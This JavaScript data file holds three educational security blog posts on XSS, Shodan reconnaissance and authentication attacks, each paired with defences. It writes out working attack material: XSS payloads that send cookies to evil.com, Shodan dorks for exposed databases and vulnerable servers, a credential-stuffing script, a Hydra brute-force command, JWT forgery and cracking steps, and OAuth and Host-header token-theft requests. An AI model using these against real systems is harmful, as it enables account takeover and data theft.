/**
 * blogData.js — Static blog post content for the portfolio.
 * Each post contains full Markdown body rendered on the client.
 */

const BLOG_POSTS = [
    {
        id: 1,
        slug: 'what-is-xss-cross-site-scripting',
        title: 'What is XSS (Cross-Site Scripting) and How It Works',
        date: '2026-03-20',
        read_time: '12 min',
        excerpt: 'A deep dive into the three types of XSS — Reflected, Stored, and DOM-based — with real payload examples, impact analysis, and modern defense strategies.',
        tags: ['xss', 'web-security', 'owasp'],
        content: `
## Introduction

Cross-Site Scripting (XSS) is one of the most prevalent and dangerous web application vulnerabilities. It consistently ranks in the **OWASP Top 10** and has been responsible for some of the largest data breaches in history. At its core, XSS allows an attacker to inject malicious scripts into web pages viewed by other users.

Unlike attacks that target the server directly, XSS exploits the **trust a user has in a particular website**. When a browser renders a page, it executes all scripts included in the HTML — it cannot distinguish between scripts written by the developer and scripts injected by an attacker.

---

## The Three Types of XSS

### 1. Reflected XSS (Non-Persistent)

Reflected XSS occurs when user input is **immediately returned** by the server in the HTTP response without proper sanitization. The malicious script is embedded in a URL or form submission and "reflected" back to the user.

**Example Attack Vector:**
\`\`\`
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
\`\`\`

When the server renders the search results page and includes the query parameter directly in the HTML, the browser executes the injected script. The victim's cookies are sent to the attacker's server.

**Real-world impact:** Phishing campaigns frequently use reflected XSS to steal session tokens from URLs distributed via email.

### 2. Stored XSS (Persistent)

Stored XSS is far more dangerous. The malicious payload is **permanently stored** on the target server — typically in a database, forum post, comment section, or user profile. Every user who views the infected page becomes a victim.

**Classic Scenario:**
\`\`\`html
<!-- Attacker submits this as a forum comment -->
<img src=x onerror="fetch('https://evil.com/log?c='+document.cookie)">
\`\`\`

Every user who loads the page with this comment unknowingly sends their session cookies to the attacker. This is how the **2005 Samy Worm** on MySpace worked — a stored XSS payload that added the attacker as a friend and replicated itself across profiles, infecting over 1 million users in 20 hours.

### 3. DOM-Based XSS

DOM-based XSS occurs entirely on the **client side**. The vulnerability exists in the JavaScript code itself, which reads data from an attacker-controllable source (like \`window.location\`) and passes it to a dangerous sink (like \`innerHTML\` or \`eval()\`).

**Vulnerable Code:**
\`\`\`javascript
// Reads the 'name' parameter from the URL and inserts it into the DOM
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
\`\`\`

**Exploit:**
\`\`\`
https://example.com/welcome?name=<img src=x onerror=alert(document.cookie)>
\`\`\`

The server never sees the malicious payload — it all happens in the browser. This makes DOM-based XSS particularly difficult to detect with server-side security tools.

---

## What Can an Attacker Do with XSS?

The impact of XSS is often underestimated. Here's what an attacker can achieve:

- **Session Hijacking** — Steal cookies and impersonate the victim
- **Keylogging** — Capture every keystroke on the page
- **Phishing** — Render fake login forms inside the legitimate page
- **Cryptocurrency Mining** — Use the victim's CPU to mine crypto
- **Worm Propagation** — Self-replicating payloads that spread to other users
- **Full Account Takeover** — Change email, password, and security questions

---

## Defense Strategies

### Output Encoding
Always encode user input before rendering it in HTML context. Use context-specific encoding:
- **HTML context** → HTML entity encoding (\`<\` becomes \`&lt;\`)
- **JavaScript context** → JavaScript escaping
- **URL context** → URL encoding

### Content Security Policy (CSP)
Deploy a strict CSP header that prevents inline script execution:
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
\`\`\`

### Input Validation
Validate and sanitize all user input on both client and server side. Use allowlists for expected input formats.

### Use Modern Frameworks
Frameworks like React, Angular, and Vue **automatically escape output** by default. React's JSX escapes all values before rendering, making XSS via \`{variable}\` nearly impossible. However, \`dangerouslySetInnerHTML\` bypasses this protection — use it with extreme caution.

### HttpOnly and Secure Cookie Flags
Set cookies with \`HttpOnly\` (prevents JavaScript access) and \`Secure\` (HTTPS only) flags:
\`\`\`
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\`

---

## Conclusion

XSS remains one of the most impactful vulnerabilities in modern web applications. Understanding the three types — Reflected, Stored, and DOM-based — is essential for both offensive security testing and defensive development. The key takeaway: **never trust user input, and always encode output in the correct context.**
`,
    },
    {
        id: 2,
        slug: 'using-shodan-like-a-hacker-and-defender',
        title: 'Using Shodan Like a Hacker and Defender',
        date: '2026-03-15',
        read_time: '15 min',
        excerpt: 'Shodan indexes every internet-connected device. Learn how attackers use it for reconnaissance and how defenders leverage it for asset discovery and exposure monitoring.',
        tags: ['shodan', 'reconnaissance', 'osint', 'network-security'],
        content: `
## What is Shodan?

Shodan is often called the **"search engine for hackers"**, but that only tells half the story. While Google indexes web pages, Shodan indexes **internet-connected devices** — servers, webcams, routers, industrial control systems, databases, and anything else with an open port.

Shodan continuously scans the entire IPv4 address space, collecting **banner information** from services running on open ports. This includes HTTP headers, SSH versions, SSL certificate details, and protocol-specific responses.

---

## The Attacker's Perspective

### Reconnaissance Without Touching the Target

One of the most powerful aspects of Shodan is that it enables **passive reconnaissance**. An attacker can gather detailed information about a target's infrastructure without sending a single packet to the target's network — because Shodan has already done the scanning.

### Finding Vulnerable Services

**Search for unpatched Apache servers:**
\`\`\`
apache 2.4.49
\`\`\`
Apache 2.4.49 contains CVE-2021-41773, a path traversal vulnerability that allows remote code execution. Shodan instantly reveals every internet-facing server running this exact version.

**Find exposed MongoDB databases (no authentication):**
\`\`\`
"MongoDB Server Information" port:27017 -authentication
\`\`\`
This query finds MongoDB instances that are publicly accessible without any authentication — a goldmine for data theft.

**Discover exposed webcams:**
\`\`\`
"Server: yawcam" "Mime-Type: text/html"
\`\`\`

**Find default-credential routers:**
\`\`\`
"default password" port:80 country:IN
\`\`\`

### Using Shodan Dorks for Targeted Attacks

Just like Google Dorking, Shodan has its own set of advanced search operators:

| Filter | Description | Example |
|--------|-------------|---------|
| \`hostname:\` | Target a specific domain | \`hostname:example.com\` |
| \`port:\` | Filter by open port | \`port:3389\` (RDP) |
| \`country:\` | Geographic filter | \`country:US\` |
| \`org:\` | Target an organization | \`org:"Amazon"\` |
| \`os:\` | Filter by OS | \`os:"Windows 7"\` |
| \`vuln:\` | Search by CVE | \`vuln:CVE-2021-44228\` |
| \`ssl.cert.subject.cn:\` | SSL certificate name | \`ssl.cert.subject.cn:example.com\` |

**Deadly combination — finding Log4Shell vulnerable servers:**
\`\`\`
vuln:CVE-2021-44228 country:US
\`\`\`

---

## The Defender's Perspective

### Asset Discovery and Shadow IT

Security teams use Shodan to discover **unknown assets** exposed to the internet. Shadow IT — services deployed without the security team's knowledge — is a massive problem in enterprises.

\`\`\`
org:"Your Company Name"
\`\`\`

This simple query reveals every device Shodan has indexed under your organization's IP space. You might discover:
- Forgotten development servers
- Exposed database instances
- Misconfigured cloud resources
- IoT devices with default credentials

### Continuous Monitoring with Shodan Monitor

Shodan Monitor is a paid feature that provides **real-time alerts** when:
- A new service appears on your IP range
- A known vulnerability is detected on your infrastructure
- SSL certificates are about to expire
- Unauthorized ports are opened

### SSL/TLS Certificate Intelligence

\`\`\`
ssl.cert.subject.cn:yourcompany.com
\`\`\`

This reveals all SSL certificates issued for your domain, helping detect:
- Unauthorized certificate issuance
- Phishing domains using similar certificates
- Expired or weak certificates in production

### Comparing Your Exposure Before and After Changes

After a firewall change or infrastructure update, use Shodan to verify that the changes took effect and no unintended services are exposed.

---

## Shodan CLI

For serious work, the Shodan command-line interface is essential:

\`\`\`bash
# Install
pip install shodan

# Initialize with your API key
shodan init YOUR_API_KEY

# Search
shodan search "apache 2.4.49" --fields ip_str,port,org

# Scan a specific IP
shodan host 8.8.8.8

# Real-time stream of all Shodan data
shodan stream --fields ip_str,port,data
\`\`\`

---

## Ethical and Legal Considerations

**Important:** Using Shodan for reconnaissance is legal — the data is publicly available. However, **exploiting** vulnerabilities discovered through Shodan without authorization is illegal under laws like the Computer Fraud and Abuse Act (CFAA) and India's IT Act Section 66.

The responsible approach:
1. Use Shodan to discover your **own** organization's exposure
2. Report vulnerabilities found on other systems through **responsible disclosure**
3. Never access, modify, or exfiltrate data from systems you don't own

---

## Conclusion

Shodan is a double-edged sword. In the hands of an attacker, it's a powerful reconnaissance tool that reveals vulnerable systems without any direct scanning. In the hands of a defender, it's an invaluable asset discovery and exposure monitoring platform. Understanding both perspectives is essential for any security professional.
`,
    },
    {
        id: 3,
        slug: 'breaking-authentication-practical-walkthrough',
        title: 'Breaking Authentication – A Practical Walkthrough',
        date: '2026-03-10',
        read_time: '18 min',
        excerpt: 'From credential stuffing to session hijacking to JWT manipulation — a hands-on guide to understanding and testing authentication mechanisms in modern web applications.',
        tags: ['authentication', 'web-security', 'penetration-testing', 'jwt'],
        content: `
## Introduction

Authentication is the gatekeeper of every web application. It's the mechanism that answers one critical question: **"Are you who you claim to be?"** When authentication breaks, everything behind it is exposed — user data, admin panels, financial information, and more.

This post walks through the most common authentication vulnerabilities, with practical examples of how they're exploited and how to defend against them.

---

## 1. Credential Stuffing

### What It Is
Credential stuffing uses **breached username/password pairs** from one service to attempt login on other services. Since users reuse passwords across multiple sites, this attack has a surprisingly high success rate (typically 0.1–2%).

### How It Works
\`\`\`python
import requests

# Load breached credentials
with open('breach_data.txt') as f:
    for line in f:
        email, password = line.strip().split(':')
        resp = requests.post('https://target.com/api/login', json={
            'email': email,
            'password': password
        })
        if resp.status_code == 200:
            print(f'[+] Valid: {email}:{password}')
\`\`\`

### Defense
- **Rate limiting** — Throttle login attempts per IP and per account
- **Multi-Factor Authentication (MFA)** — Even if credentials are valid, the attacker can't complete the second factor
- **Breached password detection** — Check passwords against known breach databases (e.g., HaveIBeenPwned API)
- **CAPTCHA** after failed attempts

---

## 2. Brute Force Attacks

### Classic Brute Force
Systematically trying every possible password combination. Tools like **Hydra** and **Burp Suite Intruder** automate this process.

\`\`\`bash
# Using Hydra against an HTTP login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
  target.com http-post-form \\
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
\`\`\`

### Password Spraying
Instead of trying many passwords against one account (which triggers lockouts), password spraying tries **one common password against many accounts**:

\`\`\`
Password123 → user1, user2, user3, ...
Summer2026! → user1, user2, user3, ...
\`\`\`

This avoids account lockout policies while still achieving a high success rate.

### Defense
- Account lockout after N failed attempts (with progressive delays)
- Monitor for distributed login attempts from multiple IPs
- Enforce strong password policies

---

## 3. Session Hijacking

### Cookie Theft via XSS
If a session cookie doesn't have the \`HttpOnly\` flag, JavaScript can access it:
\`\`\`javascript
// Injected via XSS vulnerability
new Image().src = 'https://evil.com/log?c=' + document.cookie;
\`\`\`

### Session Fixation
The attacker sets a known session ID before the victim authenticates:
1. Attacker obtains a valid session ID from the target site
2. Attacker tricks the victim into using that session ID (via URL parameter or cookie injection)
3. Victim logs in — the session ID is now authenticated
4. Attacker uses the same session ID to access the victim's account

### Defense
- **Regenerate session IDs** after login
- Set \`HttpOnly\`, \`Secure\`, and \`SameSite=Strict\` cookie flags
- Implement session timeout and absolute expiration
- Bind sessions to client fingerprints (IP, User-Agent)

---

## 4. JWT (JSON Web Token) Attacks

JWTs are widely used for stateless authentication. They consist of three parts: **Header.Payload.Signature**

### Algorithm Confusion (None Algorithm)
Some JWT libraries accept \`"alg": "none"\` — meaning no signature verification:
\`\`\`json
// Original header
{"alg": "HS256", "typ": "JWT"}

// Modified header
{"alg": "none", "typ": "JWT"}
\`\`\`

The attacker modifies the payload (e.g., changing \`"role": "user"\` to \`"role": "admin"\`), sets the algorithm to \`none\`, removes the signature, and gains admin access.

### Secret Key Brute Force
If the JWT uses HMAC (HS256) and the secret key is weak, it can be brute-forced:
\`\`\`bash
# Using jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
\`\`\`

Once the secret is cracked, the attacker can forge any JWT with arbitrary claims.

### Key Confusion (RS256 → HS256)
If the server accepts both RS256 and HS256:
1. Obtain the server's **public key** (often available at \`/.well-known/jwks.json\`)
2. Create a new JWT with \`"alg": "HS256"\`
3. Sign it using the **public key as the HMAC secret**
4. The server verifies HS256 using the public key and accepts the token

### Defense
- **Always validate the algorithm** — reject \`none\` and unexpected algorithm changes
- Use strong secrets (256+ bit random keys for HMAC)
- Implement token expiration (\`exp\` claim)
- Use asymmetric algorithms (RS256) with proper key management
- Validate all claims: \`iss\`, \`aud\`, \`exp\`, \`nbf\`

---

## 5. OAuth Misconfigurations

### Open Redirect in OAuth Flow
If the \`redirect_uri\` parameter isn't strictly validated:
\`\`\`
https://auth.target.com/authorize?
  client_id=app&
  redirect_uri=https://evil.com/callback&
  response_type=code
\`\`\`

The authorization code is sent to the attacker's server, allowing them to exchange it for an access token.

### Insecure Token Storage
Storing OAuth tokens in \`localStorage\` makes them accessible to any XSS payload. Always prefer \`HttpOnly\` cookies for token storage.

### Defense
- Strict \`redirect_uri\` validation (exact match, no wildcards)
- Use PKCE (Proof Key for Code Exchange) for public clients
- Short-lived access tokens with refresh token rotation
- Store tokens in \`HttpOnly\` cookies, not localStorage

---

## 6. Password Reset Vulnerabilities

### Predictable Reset Tokens
If password reset tokens are generated using weak randomness:
\`\`\`python
# BAD: predictable token
import time
token = hashlib.md5(str(time.time()).encode()).hexdigest()
\`\`\`

An attacker who knows the approximate time of the reset request can brute-force the token.

### Host Header Injection
If the reset email uses the \`Host\` header to construct the reset link:
\`\`\`
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@example.com"}
\`\`\`

The victim receives a reset email with \`https://evil.com/reset?token=abc123\` — clicking it sends the token to the attacker.

### Defense
- Use cryptographically secure random tokens (\`secrets.token_urlsafe(32)\`)
- Tokens should expire after 15–30 minutes
- Single-use tokens (invalidate after first use)
- Hardcode the application URL in reset emails — never use the Host header

---

## Testing Checklist

When testing authentication on an engagement, systematically check:

- [ ] Brute force protection (rate limiting, lockout)
- [ ] Password complexity requirements
- [ ] Default credentials
- [ ] Session management (cookie flags, regeneration, timeout)
- [ ] JWT implementation (algorithm validation, secret strength)
- [ ] OAuth flow (redirect_uri validation, PKCE)
- [ ] Password reset (token predictability, host header injection)
- [ ] MFA bypass attempts
- [ ] Account enumeration via login/reset error messages

---

## Conclusion

Authentication is deceptively complex. What appears to be a simple login form often involves sessions, tokens, OAuth flows, and password reset mechanisms — each with its own attack surface. The key principle: **defense in depth**. No single control is sufficient. Layer rate limiting, MFA, secure session management, and proper token validation to build authentication that withstands real-world attacks.
`,
    },
]

export default BLOG_POSTS
